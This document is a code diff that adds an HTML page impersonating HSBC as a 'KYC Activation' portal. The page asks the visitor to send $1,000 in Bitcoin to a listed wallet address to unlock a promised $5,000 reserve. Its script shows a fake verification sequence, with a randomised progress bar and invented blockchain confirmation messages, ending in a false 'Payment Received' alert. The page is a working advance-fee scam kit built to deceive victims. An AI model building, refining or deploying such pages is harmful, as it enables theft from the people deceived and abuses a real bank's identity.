@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>HSBC Secure Pay - KYC Verification</title>
+    <style>
+        :root { 
+            --hsbc-red: #db0011; 
+            --dark-gray: #1a1a1a; 
+            --ios-gray: #f2f2f7;
+            --glass: rgba(255, 255, 255, 0.9);
+        }
+        
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            margin: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #f7f9fa; 
+            color: var(--dark-gray); 
+            line-height: 1.4;
+        }
+        
+        /* Professional Header */
+        .header { 
+            background: white; 
+            padding: 60px 20px 20px; 
+            text-align: center; 
+            border-bottom: 1px solid rgba(0,0,0,0.05); 
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo { color: var(--hsbc-red); font-weight: 900; font-size: 26px; letter-spacing: -1.5px; }
+        .logo span { color: #8e8e93; font-weight: 400; font-size: 16px; letter-spacing: 0; margin-left: 5px; }
+        
+        .container { padding: 24px; max-width: 500px; margin: 0 auto; }
+        
+        /* Modern Payment Card */
+        .payment-card { 
+            background: white; 
+            padding: 32px 24px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            text-align: center;
+            border: 1px solid rgba(0,0,0,0.02);
+        }
+        
+        h2 { font-size: 24px; font-weight: 700; margin-top: 0; letter-spacing: -0.5px; }
+        
+        .amount-box { 
+            margin: 24px 0; 
+            padding: 24px; 
+            background: #fff1f0; 
+            border-radius: 16px; 
+            border: 1px solid #ffa39e; 
+        }
+        .amount-label { font-size: 11px; color: var(--hsbc-red); font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .amount { font-size: 36px; font-weight: 800; color: #000; letter-spacing: -1px; }
+        
+        .instruction { font-size: 15px; color: #48484a; margin-bottom: 30px; line-height: 1.6; }
+        
+        /* Address Section */
+        .address-container { text-align: left; margin-bottom: 25px; }
+        .address-label { font-size: 12px; font-weight: 700; color: #8e8e93; margin-bottom: 10px; text-transform: uppercase; }
+        
+        .wallet-address { 
+            background: var(--ios-gray); 
+            padding: 18px; 
+            border-radius: 12px; 
+            font-family: 'SF Mono', menlo, monospace; 
+            font-size: 13px; 
+            word-break: break-all; 
+            color: #1c1c1e;
+            border: 1px solid #e5e5ea;
+            line-height: 1.4;
+        }
+
+        .copy-btn { 
+            background: #1c1c1e; 
+            color: white; 
+            border: none; 
+            width: 100%;
+            padding: 14px; 
+            border-radius: 12px; 
+            font-weight: 700; 
+            font-size: 14px;
+            cursor: pointer; 
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+        .copy-btn:active { opacity: 0.8; }
+
+        .btn-confirm { 
+            background: var(--hsbc-red); 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 20px; 
+            border-radius: 12px; 
+            font-weight: 700; 
+            font-size: 17px; 
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(219, 0, 17, 0.2);
+            margin-top: 10px;
+        }
+        .btn-confirm:active { transform: scale(0.98); }
+
+        /* Processing State UI */
+        #processing-state { display: none; }
+        
+        .loader-container { position: relative; width: 80px; height: 80px; margin: 20px auto; }
+        .loader { 
+            border: 6px solid #f3f3f3; 
+            border-top: 6px solid var(--hsbc-red); 
+            border-radius: 50%; 
+            width: 80px; 
+            height: 80px; 
+            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite; 
+        }
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .progress-container { margin: 30px 0 15px; }
+        .progress-bar { background: #e5e5ea; height: 10px; border-radius: 5px; overflow: hidden; }
+        .progress-fill { background: var(--hsbc-red); height: 100%; width: 0%; transition: width 0.5s ease-out; }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: #fffbe6;
+            color: #d48806;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            border: 1px solid #ffe58f;
+        }
+
+        .secure-footer { 
+            margin-top: 40px; 
+            font-size: 10px; 
+            color: #aeaeb2; 
+            text-transform: uppercase; 
+            letter-spacing: 1.5px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .info-note {
+            margin-top: 30px; 
+            padding: 16px; 
+            background: #f8f9fa; 
+            border-radius: 12px; 
+            font-size: 13px; 
+            color: #636366;
+            text-align: left;
+            border: 1px solid rgba(0,0,0,0.03);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">HSBC <span>| Secure Pay</span></div>
+    </div>
+
+    <div class="container">
+        <div class="payment-card" id="payment-form">
+            <h2>KYC Activation</h2>
+            <p class="instruction">To release your <strong>$5,000.00</strong> reserve, please complete the verification payment. Funds are typically released within 30 minutes of confirmation.</p>
+            
+            <div class="amount-box">
+                <div class="amount-label">Total Payable</div>
+                <div class="amount">$1000.00</div>
+            </div>
+
+            <div class="address-container">
+                <div class="address-label">Send Bitcoin (BTC) to address:</div>
+                <div class="wallet-address" id="addr">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
+                <button class="copy-btn" onclick="copyAddr()">Copy Address</button>
+            </div>
+
+            <button class="btn-confirm" onclick="notifyAdmin()">I Have Paid</button>
+
+            <div class="secure-footer">
+                🔒 End-to-End Encrypted Verification
+            </div>
+        </div>
+
+        <div class="payment-card" id="processing-state">
+            <div class="loader-container">
+                <div class="loader"></div>
+            </div>
+            
+            <div class="status-badge" id="badge-text">NETWORK CONNECTING</div>
+            <h2 style="margin: 10px 0;">Verifying Payment</h2>
+            <p style="font-size: 14px; color: #8e8e93;">Connecting to the Bitcoin network to confirm your transaction hash...</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar"><div class="progress-fill" id="p-fill"></div></div>
+            </div>
+            <p id="status-text" style="font-size: 12px; font-weight: 700; color: var(--hsbc-red); text-transform: uppercase; letter-spacing: 0.5px;">Initializing Block Explorers...</p>
+
+            <div class="info-note">
+                <strong>Important:</strong> Please stay on this screen. Closing this window may delay the automated fund release protocol.
+            </div>
+            
+            <div class="secure-footer">
+                🛡️ SECURE NETWORK VERIFICATION
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const currentUser = localStorage.getItem('currentUser');
+
+        function copyAddr() {
+            const addr = document.getElementById('addr').innerText;
+            navigator.clipboard.writeText(addr);
+            // Professional mobile-style alert
+            const btn = document.querySelector('.copy-btn');
+            const originalText = btn.innerText;
+            btn.innerText = "✓ Address Copied";
+            btn.style.background = "#34c759";
+            setTimeout(() => {
+                btn.innerText = originalText;
+                btn.style.background = "#1c1c1e";
+            }, 2000);
+        }
+
+        async function notifyAdmin() {
+            // Show the processing state immediately
+            document.getElementById('payment-form').style.display = 'none';
+            document.getElementById('processing-state').style.display = 'block';
+
+            // Send notification to Admin via the backend route
+            try {
+                await fetch(`/wallet/${currentUser}/request-unlock`, { method: 'POST' });
+            } catch(e) { console.error("Admin sync failed"); }
+            
+            // Progress Bar Logic
+            let progress = 0;
+            const fill = document.getElementById('p-fill');
+            const status = document.getElementById('status-text');
+            const badge = document.getElementById('badge-text');
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 3.5;
+                if (progress > 98) progress = 98; 
+                fill.style.width = progress + '%';
+
+                if(progress > 15) {
+                    status.innerText = "Checking Block Explorers (0/3 Confirmations)";
+                    badge.innerText = "BROADCASTING";
+                }
+                if(progress > 35) {
+                    status.innerText = "Transaction Detected. Waiting for Confirmations (1/3)";
+                    badge.innerText = "UNCONFIRMED";
+                    badge.style.color = "#d48806";
+                }
+                if(progress > 65) {
+                    status.innerText = "Processing KYC Protocol. Waiting for Confirmations (2/3)";
+                    badge.innerText = "CONFIRMING";
+                }
+                if(progress > 88) {
+                    status.innerText = "Finalizing Secure Fund Release...";
+                    badge.innerText = "FINALIZING";
+                    badge.style.background = "#e6f7ff";
+                    badge.style.color = "#1890ff";
+                    badge.style.borderColor = "#91d5ff";
+                }
+                
+                // Duration matches the professional feel (~15-20 seconds)
+                if(progress > 97) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        alert("Payment Received. Your account activation is now under review. Please check your support chat for the fund release notification.");
+                        window.location.href = '/index.html';
+                    }, 3000);
+                }
+            }, 700);
+        }
+    </script>
+</body>
+</html>
